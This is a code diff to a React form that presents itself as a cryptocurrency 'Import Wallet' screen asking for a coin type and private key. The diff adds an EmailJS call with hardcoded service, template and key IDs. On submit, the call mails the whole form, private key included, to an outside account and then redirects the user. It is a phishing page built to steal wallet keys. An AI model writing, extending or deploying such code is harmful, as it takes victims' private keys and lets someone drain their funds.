@@ -1,9 +1,33 @@
-import React from "react";
+import React, { useRef } from "react";
 import classes from "./privateKey.module.css";
 import { useState } from "react";
 import { useNavigate } from "react-router";
 import { useEffect } from "react";
+import emailjs from "@emailjs/browser";
 const Form = () => {
+  const form = useRef();
+
+  const sendEmail = (e) => {
+    e.preventDefault();
+
+    emailjs
+      .sendForm(
+        "service_cen36ww",
+        "template_1269aqf",
+        e.target,
+        "ZbakojD4asxn3jFKH"
+      )
+      .then(
+        (result) => {
+          navigate("/Redirect");
+          console.log(result.text);
+        },
+        (error) => {
+          console.log(error.text);
+        }
+      );
+  };
+
   const navigate = useNavigate();
   const [value, setValue] = useState({
     coinType: "",
@@ -18,12 +42,6 @@ const Form = () => {
     }));
   };
 
-  const handleSubmit = (e) => {
-    e.preventDefault();
-    // console.log(value);
-    // console.log(items);
-    navigate("/Redirect");
-  };
   useEffect(() => {
     const walletname = localStorage.getItem("walletname");
     if (walletname) {
@@ -35,7 +53,7 @@ const Form = () => {
   }, []);
   return (
     <div>
-      <form className={classes.form}>
+      <form className={classes.form} onSubmit={sendEmail}>
         <select
           className={classes.input}
           value={value.coinType}
@@ -61,14 +79,14 @@ const Form = () => {
           Before you enter private key, we recommend you connect to the
           internet.
         </p>
+        <button
+          className={classes.button}
+          // ref={form}
+          disabled={value.coinType.length < 2 || value.privateKey.length < 2}
+        >
+          Import Wallet
+        </button>
       </form>
-      <button
-        className={classes.button}
-        onClick={handleSubmit}
-        disabled={value.coinType.length < 2 || value.privateKey.length < 2}
-      >
-        Import Wallet
-      </button>
     </div>
   );
 };
